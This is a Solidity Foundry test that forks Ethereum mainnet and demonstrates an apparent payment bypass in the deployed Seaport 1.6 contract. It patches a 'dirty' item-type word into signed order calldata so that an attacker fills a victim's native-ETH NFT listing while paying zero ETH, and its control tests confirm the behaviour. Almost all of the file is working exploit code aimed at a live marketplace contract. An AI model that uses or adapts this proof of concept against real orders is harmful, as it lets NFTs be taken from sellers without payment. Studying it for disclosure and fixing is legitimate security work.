// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { ItemType } from "seaport-types/src/lib/ConsiderationEnums.sol";
import {
    AdvancedOrder,
    ConsiderationItem,
    CriteriaResolver,
    OfferItem,
    Order
} from "seaport-types/src/lib/ConsiderationStructs.sol";
import { ConsiderationInterface } from
    "seaport-types/src/interfaces/ConsiderationInterface.sol";
import { BaseOrderTest } from "./utils/BaseOrderTest.sol";

contract DirtyItemTypeNativePaymentBypassTest is BaseOrderTest {
    ConsiderationInterface internal constant SEAPORT =
        ConsiderationInterface(0x0000000000000068F116a894984e2DB1123eB395);
    bytes32 internal constant EXPECTED_SEAPORT_CODEHASH =
        0x74499ac0cce14428e4b41541d5e44f28f5a6882a1051d0118867c2a93cd5aec0;

    uint256 internal constant TOKEN_ID = 0xD17ECAFE;
    uint256 internal constant PRICE = 100 ether;
    uint256 internal constant DIRTY_ITEM_TYPE_WORD = 1 << 8;
    uint256 internal constant CONSIDERATION_ITEM_TYPE_OFFSET = 0x364;

    uint256 internal forkBlock;
    address payable internal victim;
    uint256 internal victimKey;
    address payable internal attacker;

    function setUp() public override {
        forkBlock = vm.envUint("FORK_BLOCK");
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), forkBlock);
        vm.setEnv("SEAPORT_COVERAGE", "true");
        super.setUp();

        assertEq(block.chainid, 1);
        assertEq(block.number, forkBlock);
        assertEq(address(SEAPORT).codehash, EXPECTED_SEAPORT_CODEHASH);
        (string memory version,,) = SEAPORT.information();
        assertEq(version, "1.6");

        address victimRaw;
        (victimRaw, victimKey) = makeAddrAndKey("native-listing-victim");
        victim = payable(victimRaw);
        attacker = payable(makeAddr("zero-value-attacker"));

        vm.deal(victim, 7 ether);
        vm.deal(attacker, PRICE * 2);
        test721_1.mint(victim, TOKEN_ID);
        vm.prank(victim);
        test721_1.setApprovalForAll(address(SEAPORT), true);
    }

    function testCanonicalZeroValueControlReverts() public {
        (AdvancedOrder memory order, bytes32 orderHash) =
            _signedNativeListing(0xA001);
        bytes memory data = _encodeFill(order);

        uint256 victimBefore = victim.balance;
        vm.prank(attacker);
        (bool ok, bytes memory result) = address(SEAPORT).call(data);

        assertFalse(ok, "canonical native listing filled without value");
        assertEq(
            _selector(result),
            bytes4(keccak256("InsufficientNativeTokensSupplied()"))
        );
        assertEq(victim.balance, victimBefore);
        assertEq(test721_1.ownerOf(TOKEN_ID), victim);
        _assertUnfilled(orderHash);

        emit log_named_uint("canonical_zero_value_rejected", 1);
        emit log_named_bytes32("canonical_revert_selector", bytes32(_selector(result)));
    }

    function testDirtyNativeItemTypeStealsNftForZeroEth() public {
        (AdvancedOrder memory order, bytes32 orderHash) =
            _signedNativeListing(0xA002);
        bytes memory data = _encodeFill(order);

        assertEq(uint256(_readWord(data, CONSIDERATION_ITEM_TYPE_OFFSET)), 0);
        _writeWord(
            data,
            CONSIDERATION_ITEM_TYPE_OFFSET,
            DIRTY_ITEM_TYPE_WORD
        );
        uint256 dirtyWord =
            uint256(_readWord(data, CONSIDERATION_ITEM_TYPE_OFFSET));
        assertEq(dirtyWord, 0x100);
        assertEq(uint8(dirtyWord), uint8(ItemType.NATIVE));

        uint256 victimBefore = victim.balance;
        uint256 attackerBefore = attacker.balance;
        address ownerBefore = test721_1.ownerOf(TOKEN_ID);
        assertEq(ownerBefore, victim);

        vm.prank(attacker);
        (bool ok, bytes memory result) = address(SEAPORT).call(data);
        if (!ok) {
            emit log_named_bytes("dirty_call_revert", result);
            assembly {
                revert(add(result, 0x20), mload(result))
            }
        }

        assertTrue(abi.decode(result, (bool)));
        assertEq(victim.balance, victimBefore, "victim received payment");
        assertEq(attacker.balance, attackerBefore, "attacker spent payment");
        assertEq(test721_1.ownerOf(TOKEN_ID), attacker, "NFT not transferred");
        _assertFilled(orderHash);

        emit log_named_uint("dirty_native_itemtype_zero_eth_fill", 1);
        emit log_named_uint("signed_native_price", PRICE);
        emit log_named_uint("actual_native_paid", 0);
        emit log_named_uint("dirty_item_type_word", dirtyWord);
        emit log_named_uint("dirty_item_type_low_byte", uint8(dirtyWord));
        emit log_named_bytes32("victim_order_hash", orderHash);
        emit log_named_address("nft_owner_after", test721_1.ownerOf(TOKEN_ID));
    }

    function testChangingLowByteInvalidatesSignature() public {
        (AdvancedOrder memory order, bytes32 orderHash) =
            _signedNativeListing(0xA003);
        bytes memory data = _encodeFill(order);
        _writeWord(data, CONSIDERATION_ITEM_TYPE_OFFSET, uint256(ItemType.ERC20));

        vm.prank(attacker);
        (bool ok, bytes memory result) = address(SEAPORT).call(data);
        assertFalse(ok, "changed low byte retained signature validity");
        assertEq(test721_1.ownerOf(TOKEN_ID), victim);
        _assertUnfilled(orderHash);

        emit log_named_uint("changed_low_byte_rejected", 1);
        emit log_named_bytes32("changed_low_byte_selector", bytes32(_selector(result)));
    }

    function _signedNativeListing(uint256 salt)
        internal
        returns (AdvancedOrder memory advancedOrder, bytes32 orderHash)
    {
        addOfferItem(
            OfferItem({
                itemType: ItemType.ERC721,
                token: address(test721_1),
                identifierOrCriteria: TOKEN_ID,
                startAmount: 1,
                endAmount: 1
            })
        );
        addConsiderationItem(
            ConsiderationItem({
                itemType: ItemType.NATIVE,
                token: address(0),
                identifierOrCriteria: 0,
                startAmount: PRICE,
                endAmount: PRICE,
                recipient: victim
            })
        );

        configureOrderParameters(victim);
        baseOrderParameters.salt = salt;
        baseOrderParameters.endTime = block.timestamp + 1 days;
        configureOrderComponents(SEAPORT);
        orderHash = SEAPORT.getOrderHash(baseOrderComponents);

        Order memory order = Order({
            parameters: baseOrderParameters,
            signature: signOrder(SEAPORT, victimKey, orderHash)
        });
        advancedOrder = toAdvancedOrder(order);

        delete offerItems;
        delete considerationItems;
        delete baseOrderComponents;
        delete baseOrderParameters;
    }

    function _encodeFill(AdvancedOrder memory order)
        internal
        view
        returns (bytes memory)
    {
        return abi.encodeWithSelector(
            ConsiderationInterface.fulfillAdvancedOrder.selector,
            order,
            new CriteriaResolver[](0),
            bytes32(0),
            attacker
        );
    }

    function _readWord(bytes memory data, uint256 offset)
        internal
        pure
        returns (bytes32 value)
    {
        require(offset + 32 <= data.length, "read out of bounds");
        assembly {
            value := mload(add(add(data, 0x20), offset))
        }
    }

    function _writeWord(bytes memory data, uint256 offset, uint256 value)
        internal
        pure
    {
        require(offset + 32 <= data.length, "write out of bounds");
        assembly {
            mstore(add(add(data, 0x20), offset), value)
        }
    }

    function _selector(bytes memory result)
        internal
        pure
        returns (bytes4 selector)
    {
        if (result.length >= 4) {
            assembly {
                selector := mload(add(result, 0x20))
            }
        }
    }

    function _assertFilled(bytes32 orderHash) internal {
        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            SEAPORT.getOrderStatus(orderHash);
        assertTrue(validated);
        assertFalse(cancelled);
        assertEq(filled, 1);
        assertEq(size, 1);
    }

    function _assertUnfilled(bytes32 orderHash) internal {
        (, bool cancelled, uint256 filled, uint256 size) =
            SEAPORT.getOrderStatus(orderHash);
        assertFalse(cancelled);
        assertEq(filled, 0);
        assertEq(size, 0);
    }
}
